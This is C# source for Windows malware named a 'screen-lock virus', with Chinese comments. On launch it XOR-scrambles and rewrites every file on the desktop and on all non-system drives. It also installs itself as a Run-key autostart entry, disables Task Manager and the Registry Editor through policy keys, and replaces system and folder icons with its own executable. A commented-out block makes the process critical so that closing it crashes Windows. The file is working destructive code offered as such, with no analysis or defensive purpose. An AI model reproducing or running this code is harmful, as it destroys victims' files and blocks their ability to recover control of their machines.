using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace 锁机病毒
{
    internal static class Program
    {
        /// <summary>
        /// 应用程序的主入口点。
        /// </summary>
        [STAThread]
        static void Main()
        {
            //判断是否第一次打开程序
            if (Properties.Settings.Default.firstopen == false)
            {
                Properties.Settings.Default.firstopen = true;
                //获取计算机上的所有驱动器信息，返回一个 DriveInfo 类型的数组，数组元素为每个驱动器的信息

                // 创建一个新的线程并开始执行
                //桌面文件加密
                Thread thread = new Thread(new ThreadStart(WorkerThread));
                thread.Start();

                //注册表修改
                Thread thread2 = new Thread(new ThreadStart(WorkerThreadregedit));
                thread2.Start();
            }

            //磁盘全部文件加密
            Thread thread3 = new Thread(new ThreadStart(Alljiami));
            thread3.Start();
            

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }

        private static void WorkerThread()
        {
            //以下代码可以获取桌面文件夹中的所有文件路径：
            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
            string[] files = Directory.GetFiles(desktopPath);
            
            // 遍历桌面上的所有文件
            foreach (string file in files)
            {
                try
                {
                    // 读取文件内容到字节数组中
                    byte[] buffer = File.ReadAllBytes(file);

                    // 如果文件大小超过2GB，则不进行加密处理
                    /*
                    if (buffer.Length > (2L * 1024 * 1024 * 1024 - 2))
                    {
                        continue;
                    }
                    */

                    // 删除原始文件
                    File.Delete(file);

                    // 遍历字节数组中的每个字节，对其进行加密操作
                    for (int i = 0; i < buffer.Length; i++)
                    {
                        buffer[i] = (byte)(buffer[i] ^ 233); // 将字节与数字233进行异或运算
                    }

                    // 将加密后的字节数组写回到原始文件中
                    File.WriteAllBytes(file, buffer);
                }
                catch (Exception ex)
                {
                    // 处理异常
                }
            }
        }

        static void WorkerThreadregedit()
        {
            string where = Process.GetCurrentProcess().MainModule.FileName;
            RegistryKey keypass = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);//true表示可以修改
            string[] keynames = keypass.GetValueNames();//框框内是个集合
            bool result = false;
            foreach (string keyname in keynames)//遍历run项目下的所有子键,查看病毒子健是否存在
            {
                if (keyname == "病毒")
                {
                    //MessageBox.Show("有子健");
                    result = true;
                    break;//退出循环
                }
                /* else
                 {
                     MessageBox.Show("无子健");
                     result = false;                   
                 }*/
            }

            if (result == false)
            {
                //MessageBox.Show("无子键");
                keypass.SetValue("病毒", where);//2创建一个名字为病毒的键，值为where变量               
            }
            keypass.Close();

            // 禁止打开注册表
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", 1, RegistryValueKind.DWord);

            // 禁止打开任务管理器
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 1, RegistryValueKind.DWord);

            //Application.ExecutablePath为本程序路径
            // 设置文件夹图标path的值为1-44
            for (int path = 0; path < 44; path++)
            {
                Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons\" + path, "", Application.ExecutablePath, RegistryValueKind.String);
            }

            // 设置“我的电脑”图标
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);

            // 设置“控制面板”图标
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{208D2C60-3AEA-1069-A2D7-08002B30309D}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);

            // 设置“回收站”图标
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);

            // 设置“加密文件夹”图标
            Registry.SetValue(@"HKEY_CLASSES_ROOT\CLSID\{21EC2020-3AEA-1069-A2DD-08002B30309D}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);

            // 设置“网络上的计算机”图标
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{7007ACC7-3202-11D1-AAD2-00805FC1270E}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);

            // 设置“我的文档”图标
            Registry.SetValue(@"HKEY_CLASSES_ROOT\CLSID\{2559a1f1-21d7-11d4-bdaf-00c04f60b9f0}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);

            // 设置“我的图片”图标
            Registry.SetValue(@"HKEY_CLASSES_ROOT\CLSID\{2559a1f0-21d7-11d4-bdaf-00c04f60b9f0}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);

        }

        static void Alljiami()//对盘符所有文件加密
        {
            // 获取所有盘符信息
            DriveInfo[] drives = DriveInfo.GetDrives();

            // 遍历每个盘符
            foreach (DriveInfo drive in drives)
            {
                if (drive.DriveType == DriveType.Fixed && !drive.IsReady)
                { 
                    // 过滤未准备好的驱动器
                    continue;
                }
                if (drive.Name == @"C:\")
                { 
                    // 过滤系统盘
                    continue;
                }

                try
                {
                    // 遍历当前盘符下的所有文件
                    var files = Directory.GetFiles(drive.Name, "*.*", SearchOption.AllDirectories);

                    // 输出所有文件路径
                    foreach (string file in files)
                    {
                        //执行
                        try
                        {
                            // 读取文件内容到字节数组中
                            byte[] buffer = File.ReadAllBytes(file);

                            // 如果文件大小超过2GB，则不进行加密处理
                            /*
                            if (buffer.Length > (2L * 1024 * 1024 * 1024 - 2))
                            {
                                continue;
                            }
                            */

                            // 删除原始文件
                            File.Delete(file);

                            // 遍历字节数组中的每个字节，对其进行加密操作
                            for (int i = 0; i < buffer.Length; i++)
                            {
                                buffer[i] = (byte)(buffer[i] ^ 233); // 将字节与数字233进行异或运算
                            }

                            // 将加密后的字节数组写回到原始文件中
                            File.WriteAllBytes(file, buffer);
                        }
                        catch (Exception ex)
                        {
                            // 处理异常
                        }
                    }
                }
                catch(Exception ex)
                {
                    //error
                }
            }
        }

        // 遍历指定目录下的所有文件和子目录的自定义运行函数TraverseDirectory()
        static string[] TraverseDirectory(string path)
        {
            // 存储所有文件路径的列表
            var files = new System.Collections.Generic.List<string>();

            // 遍历所有文件
            foreach (string file in Directory.GetFiles(path))
            {
                files.Add(file);
            }

            // 递归遍历所有子目录
            foreach (string dir in Directory.GetDirectories(path))
            {
                string[] subFiles = TraverseDirectory(dir);
                files.AddRange(subFiles);
            }

            return files.ToArray();
        }

    }
}

/*
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////关闭窗体就蓝屏效果
//添加System.Runtime.InteropServices和System.Diagnostics的引用

//声明引用
[DllImport("ntdll.dll", SetLastError = true)]
private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
//窗体关闭事件，在窗体事件中的FormClosing
private void Form1_FormClosing(object sender, FormClosingEventArgs e)
{
    int isCritical = 1;  // we want this to be a Critical Process
    int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)

    Process.EnterDebugMode();  //acquire Debug Privileges

    // setting the BreakOnTermination = 1 for the current process
    NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));

}
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/